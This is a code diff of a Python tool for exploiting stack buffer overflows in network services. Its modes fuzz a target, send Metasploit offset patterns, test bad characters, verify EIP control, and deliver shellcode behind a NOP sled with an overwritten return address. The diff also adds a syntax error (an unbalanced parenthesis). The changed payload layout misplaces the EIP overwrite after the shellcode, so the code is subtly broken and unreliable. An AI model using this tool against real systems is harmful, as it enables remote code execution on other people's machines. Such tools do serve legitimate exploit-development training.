@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import socket, time, sys, argparse, subprocess, struct
+import socket, time, sys, argparse, subprocess
 
 def main():
 
@@ -13,8 +13,9 @@ def main():
   parser.add_argument('-e', '--end', default="", type=str, help="(DEFUALT = None) End of the string you want to send to application")
   parser.add_argument('-l', '--length', type=int, help="Length of the pattern you want to send")
   parser.add_argument('-q', '--query', type=str, help="Value found in EIP when debugger crashed from the pattern create")
+  parser.add_argument('-x', '--exclude', default="", type=str, help='(FORMAT = "0f83e189") The chars to exclude in bad char test')
   parser.add_argument('-o', '--offset', type=int, help="The offset of the EIP")
-  parser.add_argument('-r', '--eip', type=int, help='The new EIP value you want to send in your payload')
+  parser.add_argument('-r', '--eip', type=str, help='(FORMAT = "0f83e189") The new EIP value you want to send in your payload as a string')
   parser.add_argument('-c', '--shellcode', type=str, help='The /path/to/shellcode you want sent in the buffer')
   parser.add_argument('-t', '--timeout', default=2, type=int, help='(DEFAULT = 2s) How long the timeout should be for the connection')
   args = parser.parse_args()
@@ -27,6 +28,7 @@ def main():
   end = args.end
   length = args.length
   query = args.query
+  exclude = args.exclude
   offset = args.offset
   eip = args.eip
   shellcode = args.shellcode
@@ -56,46 +58,46 @@ def main():
       num_bytes = 100 * inc
       string = start + "A" * num_bytes + end
       try:
-        socket_send(string, f"Fuzzing with {(len(string) - len(start))} bytes")
+        socket_send(string, f"[*] Fuzzing with {(len(string) - len(start))} bytes")
       except:
-        print(f"Fuzzing crashed at {(len(string) - len(start))} bytes")
+        print(f"[*] Fuzzing crashed at {(len(string) - len(start))} bytes")
         sys.exit(0)
       inc += 1
       time.sleep(1)
 
   elif action == 'pattern':
-    if (length is None): raise Exception("Must supply a length if using pattern")
+    if (length is None): raise Exception("[X] Must supply a length if using pattern")
     pattern = create_pattern(length)
     string = start + pattern + end
-    socket_send(string, f"Sending pattern of size {length}", "Patern sent")
+    socket_send(string, f"[*] Sending pattern of size {length}", "[*] Patern sent")
   
   elif action == 'chars':
-    if (offset is None): raise Exception("Must supply an offset if using chars")
+    if (offset is None): raise Exception("[X] Must supply an offset if using chars")
     try:
-      all_chars = get_all_bytes()
-      filler_chars = offset - (len(start) + len(all_chars) + len(end))
+      all_chars = get_all_bytes(excluded_bytes=bytes.fromhex(exclude))
+      filler_chars = offset - (len(start) + len(end))
       payload = [
         start,
-        all_chars,
         b'A' * (filler_chars),
         end,
-        b'B' * (4)
+        b'B' * (4),
+        all_chars
       ]
       payload = b"".join(payload)
-      socket_send(payload, f"Sending all possible bytes (length={len(payload)} bytes)", "All possible bytes sent")
+      socket_send(payload, f"[*] Sending all possible bytes (length={len(payload)} bytes)", "[*] All possible bytes sent")
     except:
-      print("Check your debugger for a crash")
+      print("[*] Check your debugger for a crash")
 
   elif action == 'offset':
-    if (query is None): raise Exception("Must supply a query if using offset")
-    print(f"Finding offset of the query {query}")
+    if (query is None): raise Exception("[X] Must supply a query if using offset")
+    print(f"[*] Finding offset of the query {query}")
     query = query.strip()
     result = determine_offset(query)
     print(result.decode("utf-8"))
 
   elif action == 'verify':
-    if (offset is None): raise Exception("Must supply an offset if using verify")
-    print(f"Verifying the offset and seding additional data")
+    if (offset is None): raise Exception("[X] Must supply an offset if using verify")
+    print(f"[*] Verifying the offset and seding additional data")
 
     # Build the payload
     payload = [
@@ -103,24 +105,34 @@ def main():
       b"A" * (offset), # The overflow
       end,
       b"B" * 4, # The new EIP
-      b"C" * 100, # The Stack 
+      b"C" * 1000, # The Stack 
     ]
     payload = b"".join(payload)
     try:
-      socket_send(payload, "Sending verification payload", "Payload sent")
+      socket_send(payload, "[*] Sending verification payload", "[*] Payload sent")
     except:
-      print("Check your debugger for a crash")
+      print("[*] Check your debugger for a crash with EIP being 42424242")
+      print("[*] If debugger has correct EIP, then you now should evaluate where to put your shellcode")
+      print("[*] Remember, you may need to add to registers to skip over the start value if provided")
+      if (len(start) > 0):
+        print(f'[*] In this case you may need "add <register>,{len(start)}"')
 
   elif action == 'exploit':
-    if (offset is None): raise Exception("Must supply the offset if using exploit")
-    if (shellcode is None): raise Exception("Must supply a path to shellcode if using exploit")
-    if (eip is None): raise Exception("Must supply an eip if using exploit")
+    if (offset is None): raise Exception("[X] Must supply the offset if using exploit")
+    if (shellcode is None): raise Exception("[X] Must supply a path to shellcode if using exploit")
+    if (eip is None): raise Exception("[X] Must supply an eip if using exploit")
+
+    # Warn user of EIP
+    print("[!] If your EIP contains a bad character, the exploit will fail")
 
     # Pack the bytes into little edian
-    eip = struct.pack("<I", eip)
+    eip = bytes.fromhex(eip)
+    eip_array = bytearray(eip)
+    eip_array.reverse()
+    eip = bytes(eip_array)
 
     # Check for shellcode file
-    print("Getting shellcode file provided")
+    print("[*] Getting shellcode file provided")
     shellcode_string = b""
     with open(shellcode, 'rb') as shellcode:
       byte_in_file = shellcode.read(1)
@@ -129,16 +141,15 @@ def main():
         byte_in_file = shellcode.read(1)
 
     # Build the payload
-    print("Building full payload")
+    print("[*] Building full payload")
     payload = [
       start,
-      b'\x90' * (offset - len(shellcode_string)),
+      b'\x90' * (offset)),
       shellcode_string,
       eip
     ]
     payload = b"".join(payload)
-    socket_send(payload, "Sending shellcode")
-
+    socket_send(payload, "[*] Sending shellcode")
 
 
 def system_call(command, timeout=0):
@@ -152,12 +163,15 @@ def determine_offset(pattern_in_eip, path_to_pattern_offset="/usr/share/metasplo
 def create_pattern(length, path_to_pattern_create="/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"):
   return system_call([path_to_pattern_create, "-l", f"{length}"]) 
 
-def get_all_bytes(include_null=False):
+def get_all_bytes(include_null=False, excluded_bytes=b""):
   byte_string = b""
   begin = 1
   if (include_null): begin = 0
   for i in range(begin, 256):
-    byte_string = byte_string + i.to_bytes(1, "big")
+    byte_val = i.to_bytes(1, "big")
+    # If the excluded bytes does not have that byte, then add it
+    if(excluded_bytes.find(byte_val) == -1):
+      byte_string = byte_string + byte_val
   return byte_string
 
 if __name__ == "__main__":
